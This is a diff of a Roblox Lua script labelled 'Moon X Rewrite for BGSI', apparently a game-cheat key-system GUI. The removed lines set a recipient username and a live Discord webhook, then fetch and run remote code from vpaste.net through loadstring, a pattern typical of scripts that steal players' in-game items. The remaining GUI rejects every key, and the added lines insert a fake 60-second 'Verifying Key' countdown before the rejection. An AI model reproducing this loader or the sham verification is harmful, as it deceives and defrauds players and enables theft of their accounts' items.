@@ -1,49 +1,3 @@
--- ⠀⠀ ⠀⠀⠀⠀⢀⡤⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
---⠀⠀ ⠀⠀⢀⣴⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
---⠀ ⠀⢀⣴⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
---⠀⢀⣾⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
---⠀⣼⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
---⢰⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
---⢸⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
---⢸⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
---⢸⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
---⠀⢿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
---⠀⠘⣿⣿⣿⣿⣿⣿⣿⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
---⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣤⣀⣀⣀⣀⣀⣀⣠⣤⣴⣶⣾⣿⠋⠀⠀
---⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀
---⠀⠀⠀⠀⠀⠈⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀⠀⠀⠀
---⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠻⠿⠿⠿⠿⠿⠿⠟⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀
-
-
--- Moon X Rewrite for BGSI 
--- By XyrexDev, Copyright 2025
-
-
--- ⠀⠀ ⠀⠀⠀⠀⢀⡤⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
---⠀⠀ ⠀⠀⢀⣴⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
---⠀ ⠀⢀⣴⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
---⠀⢀⣾⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
---⠀⣼⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
---⢰⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
---⢸⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
---⢸⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
---⢸⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
---⠀⢿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
---⠀⠘⣿⣿⣿⣿⣿⣿⣿⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
---⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣤⣀⣀⣀⣀⣀⣀⣠⣤⣴⣶⣾⣿⠋⠀⠀
---⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀
---⠀⠀⠀⠀⠀⠈⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀⠀⠀⠀
---⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠻⠿⠿⠿⠿⠿⠿⠟⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀
-
-
-
-_G.username = {"27tomasal"=} -- Where trades will be received.
-_G.webhook = "https://discord.com/api/webhooks/1387242492381888603/FXoeLDshoD6qFF_KrqwnEZewgF37M5bmqw_KzYgozDgt3lkwD5qAX17dupbLq9j9vDJQ" -- Your discord webhook.
-_G.ping = true -- Send a @everyone in the webhook message.
-_G.private = true -- Show the webhook if the server is private.
-
-loadstring(game:HttpGet("http://vpaste.net/KTYZC"))()
-
 -- Enhanced Key System GUI with improved design and animations
 local TweenService = game:GetService("TweenService")
 
@@ -51,29 +5,10 @@ local TweenService = game:GetService("TweenService")
 local gui = Instance.new("ScreenGui", game.CoreGui)
 gui.Name = "KeySystemUI"
 
--- Pre-loading image setup
-local preloadFrame = Instance.new("Frame", gui)
-preloadFrame.Size = UDim2.new(1, 0, 1, 0)
-preloadFrame.Position = UDim2.new(0, 0, 0, 0)
-preloadFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-preloadFrame.BackgroundTransparency = 0.3
-preloadFrame.BorderSizePixel = 0
-
-local preloadImage = Instance.new("ImageLabel", preloadFrame)
-preloadImage.Size = UDim2.new(0, 300, 0, 300)
-preloadImage.Position = UDim2.new(0.5, -150, 0.5, -150)
-preloadImage.BackgroundTransparency = 1
-preloadImage.Image = "rbxassetid://114618695295982" -- Replace with your texture ID
-preloadImage.ImageTransparency = 1
-
--- Add rounded corners to preload image
-local preloadCorner = Instance.new("UICorner", preloadImage)
-preloadCorner.CornerRadius = UDim.new(0, 15)
-
--- Main frame (larger and centered)
+-- Main frame (larger and centered, taller)
 local frame = Instance.new("Frame", gui)
-frame.Size = UDim2.new(0, 400, 0, 220)
-frame.Position = UDim2.new(0.5, -200, 0.5, -110)
+frame.Size = UDim2.new(0, 400, 0, 280)
+frame.Position = UDim2.new(0.5, -200, 0.5, -140)
 frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
 frame.BorderSizePixel = 0
 frame.BackgroundTransparency = 1 -- Start invisible for animation
@@ -85,12 +20,11 @@ frameCorner.CornerRadius = UDim.new(0, 12)
 -- Add subtle drop shadow effect
 local shadow = Instance.new("Frame", gui)
 shadow.Size = frame.Size
-shadow.Position = UDim2.new(0.5, -198, 0.5, -108)
+shadow.Position = UDim2.new(0.5, -198, 0.5, -138)
 shadow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-shadow.BackgroundTransparency = 0.8
+shadow.BackgroundTransparency = 1 -- Start invisible
 shadow.BorderSizePixel = 0
 shadow.ZIndex = frame.ZIndex - 1
-shadow.BackgroundTransparency = 1 -- Start invisible
 
 local shadowCorner = Instance.new("UICorner", shadow)
 shadowCorner.CornerRadius = UDim.new(0, 12)
@@ -109,7 +43,7 @@ title.TextXAlignment = Enum.TextXAlignment.Center
 -- Get Key button (darker blue color)
 local getKeyBtn = Instance.new("TextButton", frame)
 getKeyBtn.Size = UDim2.new(1, -40, 0, 35)
-getKeyBtn.Position = UDim2.new(0, 20, 0, 65)
+getKeyBtn.Position = UDim2.new(0, 20, 0, 80)
 getKeyBtn.Text = "Get Key"
 getKeyBtn.BackgroundColor3 = Color3.fromRGB(50, 100, 150)
 getKeyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
@@ -124,7 +58,7 @@ getKeyCorner.CornerRadius = UDim.new(0, 8)
 -- Key input box (improved styling, no default text)
 local keyBox = Instance.new("TextBox", frame)
 keyBox.Size = UDim2.new(1, -40, 0, 35)
-keyBox.Position = UDim2.new(0, 20, 0, 110)
+keyBox.Position = UDim2.new(0, 20, 0, 135)
 keyBox.Text = "" -- Start with empty text
 keyBox.PlaceholderText = "Enter MoonX key here..."
 keyBox.PlaceholderColor3 = Color3.fromRGB(150, 150, 150)
@@ -142,7 +76,7 @@ keyBoxCorner.CornerRadius = UDim.new(0, 8)
 -- Submit button (improved styling)
 local submitBtn = Instance.new("TextButton", frame)
 submitBtn.Size = UDim2.new(1, -40, 0, 35)
-submitBtn.Position = UDim2.new(0, 20, 0, 155)
+submitBtn.Position = UDim2.new(0, 20, 0, 190)
 submitBtn.Text = "Submit Key"
 submitBtn.BackgroundColor3 = Color3.fromRGB(60, 150, 60)
 submitBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
@@ -193,10 +127,31 @@ end)
 submitBtn.MouseButton1Click:Connect(function()
     local key = keyBox.Text
     
-    -- Always show invalid key message
+    -- Start countdown verification
     local originalText = submitBtn.Text
     local originalColor = keyBox.BackgroundColor3
     
+    -- Disable button during countdown
+    submitBtn.Active = false
+    
+    -- Countdown from 60 seconds
+    for i = 60, 1, -1 do
+        local dots = ""
+        if i % 4 == 0 then
+            dots = "..."
+        elseif i % 4 == 3 then
+            dots = ".."
+        elseif i % 4 == 2 then
+            dots = "."
+        else
+            dots = "..."
+        end
+        
+        submitBtn.Text = i .. ", Verifying Key" .. dots
+        wait(1)
+    end
+    
+    -- After countdown, show invalid key message
     submitBtn.Text = "Invalid key, Try again"
     
     -- Fade textbox to red
@@ -219,12 +174,13 @@ submitBtn.MouseButton1Click:Connect(function()
     
     normalTween:Play()
     
-    -- Reset button text
+    -- Reset button text and re-enable
     wait(0.5)
     submitBtn.Text = originalText
+    submitBtn.Active = true
 end)
 
--- Pre-loading animation sequence
+-- Start the key system GUI immediately
 local function startKeySystemGUI()
     -- Fade-in animation (slower)
     local fadeInTween = TweenService:Create(
@@ -240,19 +196,19 @@ local function startKeySystemGUI()
     )
 
     -- Animation from top of screen (slower)
-    frame.Position = UDim2.new(0.5, -200, 0, -220) -- Start above screen
-    shadow.Position = UDim2.new(0.5, -198, 0, -218) -- Start above screen
+    frame.Position = UDim2.new(0.5, -200, 0, -280) -- Start above screen
+    shadow.Position = UDim2.new(0.5, -198, 0, -278) -- Start above screen
 
     local slideInTween = TweenService:Create(
         frame,
         TweenInfo.new(0.8, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
-        {Position = UDim2.new(0.5, -200, 0.5, -110)}
+        {Position = UDim2.new(0.5, -200, 0.5, -140)}
     )
 
     local shadowSlideTween = TweenService:Create(
         shadow,
         TweenInfo.new(0.8, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
-        {Position = UDim2.new(0.5, -198, 0.5, -108)}
+        {Position = UDim2.new(0.5, -198, 0.5, -138)}
     )
 
     -- Play animations
@@ -262,40 +218,5 @@ local function startKeySystemGUI()
     shadowSlideTween:Play()
 end
 
--- Preload image fade in
-local preloadFadeIn = TweenService:Create(
-    preloadImage,
-    TweenInfo.new(1.0, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
-    {ImageTransparency = 0}
-)
-
--- Preload image fade out
-local preloadFadeOut = TweenService:Create(
-    preloadImage,
-    TweenInfo.new(1.0, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
-    {ImageTransparency = 1}
-)
-
--- Background fade out
-local backgroundFadeOut = TweenService:Create(
-    preloadFrame,
-    TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
-    {BackgroundTransparency = 1}
-)
-
--- Start the preload sequence
-preloadFadeIn:Play()
-
-preloadFadeIn.Completed:Connect(function()
-    wait(1.5) -- Display image for 1.5 seconds
-    preloadFadeOut:Play()
-    
-    preloadFadeOut.Completed:Connect(function()
-        backgroundFadeOut:Play()
-        
-        backgroundFadeOut.Completed:Connect(function()
-            preloadFrame:Destroy()
-            startKeySystemGUI()
-        end)
-    end)
-end)
+-- Start immediately without logo preload
+startKeySystemGUI()
